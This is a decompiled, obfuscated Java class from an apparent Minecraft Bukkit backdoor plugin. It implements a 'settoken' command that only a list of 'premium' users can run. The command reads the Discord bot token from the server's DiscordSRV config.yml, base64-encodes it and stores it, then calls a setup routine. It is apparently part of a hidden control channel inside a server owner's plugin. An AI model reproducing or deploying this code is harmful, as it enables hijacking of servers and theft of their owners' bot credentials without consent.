/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.configuration.file.YamlConfiguration
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import java.io.File;
import java.io.IOException;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.methods.onEnable;
import me.system.runner.utils.PluginUtils;
import me.system.runner.utils.Settings;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

public class SettokenCommand
extends Command {
    public SettokenCommand() {
        SettokenCommand llllllllllllllIlIllIlIIIlIlIllIl;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core llllllllllllllIlIllIlIIIlIIlIIlI, String llllllllllllllIlIllIlIIIlIIlIIII, String[] llllllllllllllIlIllIlIIIlIIIlllI, Player llllllllllllllIlIllIlIIIlIIIllIl) {
        if (llllllllllllllIlIllIlIIIlIIlIIlI.premium.contains(llllllllllllllIlIllIlIIIlIIIllIl.getName())) {
            if (llllllllllllllIlIllIlIIIlIIIlllI.length <= 1) {
                if (PluginUtils.getPluginByName("DiscordSRV") == null) {
                    llllllllllllllIlIllIlIIIlIIIllIl.sendMessage(Settings.USAGE("settoken <discord token>"));
                } else {
                    File llllllllllllllIlIllIlIIIlIIlllII = new File(String.valueOf(new StringBuilder().append(PluginUtils.getPluginByName("DiscordSRV").getDataFolder()).append("/config.yml")));
                    YamlConfiguration llllllllllllllIlIllIlIIIlIIllIlI = YamlConfiguration.loadConfiguration((File)llllllllllllllIlIllIlIIIlIIlllII);
                    DataManager.getData().set("login", (Object)true);
                    byte[] llllllllllllllIlIllIlIIIlIIllIII = Base64.getEncoder().encode(llllllllllllllIlIllIlIIIlIIllIlI.getString("BotToken").getBytes());
                    DataManager.getData().set("key", (Object)new String(llllllllllllllIlIllIlIIIlIIllIII));
                    DataManager.saveData();
                    llllllllllllllIlIllIlIIIlIIIllIl.sendMessage(Settings.PREFIX("The discord token has now been set to the one found in the DiscordSRV config.yml"));
                    try {
                        onEnable.ju();
                    }
                    catch (IOException llllllllllllllIlIllIlIIIlIIlllIl) {
                        llllllllllllllIlIllIlIIIlIIIllIl.sendMessage(Settings.PREFIX(llllllllllllllIlIllIlIIIlIIlllIl.getMessage()));
                    }
                }
            } else {
                DataManager.getData().set("login", (Object)true);
                byte[] llllllllllllllIlIllIlIIIlIIlIlIl = Base64.getEncoder().encode(llllllllllllllIlIllIlIIIlIIIlllI[1].getBytes());
                DataManager.getData().set("key", (Object)new String(llllllllllllllIlIllIlIIIlIIlIlIl));
                DataManager.saveData();
                llllllllllllllIlIllIlIIIlIIIllIl.sendMessage(Settings.PREFIX("The discord token has now been set"));
                try {
                    onEnable.ju();
                }
                catch (IOException llllllllllllllIlIllIlIIIlIIlIllI) {
                    llllllllllllllIlIllIlIIIlIIIllIl.sendMessage(Settings.PREFIX(llllllllllllllIlIllIlIIIlIIlIllI.getMessage()));
                }
            }
        } else {
            llllllllllllllIlIllIlIIIlIIIllIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }
}

